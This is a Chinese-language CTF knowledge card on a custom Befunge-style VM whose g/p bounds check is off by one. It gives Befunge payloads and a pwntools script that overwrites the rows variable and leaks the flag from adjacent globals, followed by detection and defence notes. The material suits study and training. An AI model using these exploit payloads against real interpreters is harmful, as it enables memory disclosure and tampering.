---
id: ctf-pwn-befunge-vm-gp-dimension-offbyone-global-oob-read
title: 自定义 Befunge 类 VM 的 g/p 维度边界用 >rows/>cols：越界读写相邻全局变量泄露 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: befunge-vm-gp-dimension-offbyone-global-oob
aliases:
- PicoCTF homework
- Befunge VM 越界
- g 指令越界
- p 指令越界
- 二维棋盘 VM 越界
- rows/cols 边界 off-by-one
- 代码虚拟化 OOB
tags:
- pwn
- ctf
- vm
- befunge
- interpreter
- out-of-bounds
- off-by-one
- global-buffer-overflow
- arbitrary-read
- reverse
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:10:09+08:00'
  notes: 已对照原文逐项核对：g/p 边界判断确为 stack[sn-1] > rows || stack[sn-2] > cols（off-by-one），rows=50/cols=22、board[1100]、.bss 布局与 flag 位于 board 之后、读取 rows 并用 p 改写为 0xff、flag 偏移 52 行 8 列、逐字节远程 exp 均与原文一致；已读全部 3 张图（stack/board 布局示意、本地 00!g 测试输出）。修正 PoC 注释一处：00!g 实际按 x=0,y=1 读 board[1][0]（非 board[0][0]）。未验证点：未复跑远程 exp；原文为 CTF 题目，无组件版本区间，未设 affected_versions；frontmatter 无 sources/source_url。dedup 仅自身草稿命中，其余候选均为 new（dup-scan 无本卡 pair）。
---

## 一句话结论

自定义 Befunge 类二维 VM 的 `g`（读棋盘）和 `p`（写棋盘）指令用 `stack[y] > rows` / `stack[x] > cols` 做边界判断，而合法下标是 `0..rows-1` / `0..cols-1`；传入等于 `rows`/`cols` 的坐标即可越界到相邻全局变量（rows/cols/diry/pcx/pcy/flag），先用 `g` 读出 rows、用 `p` 把 rows 改为 0xff 扩大窗口，再逐字节读取 flag。

## 原理

- 程序把 flag 读入 .bss 全局 `flag`，然后接受最多 4 行输入作为二维棋盘 `board`（`rows=50`、`cols=22`，扁平 `char board[1100]`），`step()` 以 `board[22*pcy + pcx]` 取当前字符并按 VM 指令解释执行（栈运算、输出、方向控制、`g`/`p`、`@` 退出）。
- `g` 的实现：先断言 `sn>=2` 和坐标非负，再用 `if (stack[sn-1] > rows || stack[sn-2] > cols) assert;` 检查范围；由于判断是 `>` 而不是 `>=`，坐标 `y == rows`（50）或 `x == cols`（22）能通过检查。随后执行 `stack[sn-2] = board[22*stack[sn-1] + stack[sn-2]]`。
- `board` 是扁平数组，`board[22*50 + x]` 已经落到 board 之后的 .bss：rows、cols、diry、pcx、pcy 等全局变量，以及更后面的 `flag`；`p` 的检查同样用 `>`，可把栈上的值写进这些相邻全局。
- 利用思路：先用 VM 程序把 y=50、x=0 压栈并 `g`，读出 rows（50）；再用 `p` 把 rows 改成 0xff（255），使后续 `g` 的 `> rows` 检查放宽，可从 y=51..254 读到更远的 .bss，包括 flag；配合 `,` 指令输出读到的字符。
- flag 相对 board 的偏移固定（原文计算为 52 行 8 列），逐字节设置 `(x,y)` 并读取即可恢复 flag；坐标字节本身可能含换行（如 0x0a）等特殊字符，需要单独构造输入或用空格跳过。
- 根因：VM 的“棋盘尺寸”边界检查与真实数组布局不一致（off-by-one），且扁平数组与敏感全局变量相邻；`g`/`p` 是 VM 暴露的任意读写原语。

## 触发条件

- 目标为自定义 VM/解释器，内存访问指令用维度字段做边界判断但使用 `>`/`<` 而非 `>=`/`<=`，或边界取自输入/全局可改。
- VM 工作区数组与敏感数据（flag、密钥、长度字段、控制变量）位于同一 .bss 段且相邻。
- 攻击者可提交 VM 程序/字节码，VM 提供 get/put 类读写指令，并有输出指令可回读数据。
- 目标程序把 flag 等敏感数据放在可越界到达的全局内存中。

## 利用步骤

1. 逆向 VM 指令集与全局布局：确认 board 维度（rows/cols）、`g`/`p` 的索引顺序（`y*cols+x`）、边界判断条件与相邻全局变量。
2. 先用 VM 程序读取 rows（y=rows、x=0），确认越界读成功并得到 rows 值。
3. 用 `p` 把 rows 写成更大的值（如 0xff），扩大 `g` 的允许范围。
4. 计算 flag 相对 board 的偏移（原文为 52 行 8 列），构造 VM 程序逐字节读取并用 `,` 输出。
5. 对坐标字节含换行/特殊字符的情况单独构造输入；脚本循环 y/x 远程跑。
6. 汇总输出得到 flag；记录 VM 程序与坐标。

## PoC

VM 程序片段（Befunge 风格）：

```text
00!g,@          # `00!` 得 x=0,y=1，g 读 board[1][0]（输入第 2 行首字节）并输出，验证 g 指令可用
00!g00!0!gp0!:+0!gv   # 读 rows 并将其改为大值
@,gg!0+!0+:!0<        # 循环读取并输出越界字符
```

远程逐字节读取（原文 exp 结构）：

```python
from pwn import *
context.log_level = "warn"
res = b""
for y in range(52, 55):
    for i in range(0, 24):
        io = remote("target", 1337)
        io.recvuntil(b"Enter homework sol\n")
        io.sendline(b"00!g00!0!gp0!:+0!gv")     # 读 rows → 改写为 0xff
        io.sendline(b"\xff\x32" + bytes([i, y]) + b" " + b"@,gg!0+!0+:!0<")
        io.sendline(b"R")
        tmp = io.clean(5)
        if b"run" in tmp or b"\x00" in tmp:
            io.close()
            continue
        res += tmp if tmp else b"?"
        print(res)
        io.close()
```

```text
# y=50(x=0) 读出 rows=50；p 把 rows 写为 0xff 后，y>50 的 g 即可越界读到 flag。
# 坐标本身为 0x0a（换行）时会导致输入截断，需要单独处理。
```

## 变体与关联

- 变体：边界检查用 `>` 而非 `>=` 是最常见的 off-by-one；也可能出现在 `x + y*cols` 的乘法溢出、dimension 取自输入未校验等。
- 变体：若只有 `g`（读）没有 `p`（写），可先读 rows/长度等控制字段寻找进一步原语；若只有 `p`，可改控制变量或返回地址等。
- 关联：[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（字节码 VM 有符号偏移越界写相邻全局→system）、[[ctf-pwn-bytecode-sandbox-header-memsize-stack-oob-rop]]（边界取自输入头部→栈溢出 ROP）、[[ctf-pwn-custom-vm-opcode-native-memory-got-restart-onegadget]]（自定义 VM 原生内存/GOT）。本卡是二维棋盘 VM 的维度 off-by-one → 相邻全局读泄露。
- 边界：`g`/`p` 有严格 `>=` 边界、board 与敏感数据不相邻、无输出指令、或 flag 不在同一映射内时失效。

## 检测与防御

- 检测：VM 的 `g`/`p` 等内存指令边界条件使用 `>`/`<`；索引等于维度值时仍通过；VM 程序反复访问 y=rows/x=cols 等边界坐标；输出异常全局数据。
- 防御：边界统一使用 `0 <= idx && idx < dim`；维度与真实分配尺寸绑定；把 VM 内存区与敏感全局隔离（独立分配/守卫页）；限制 `g`/`p` 坐标范围并做乘法溢出检查。
- 加固：VM 内存沙箱（独立地址空间/MPU）、编译器/静态检查边界条件、对 VM 程序做配额与审计。
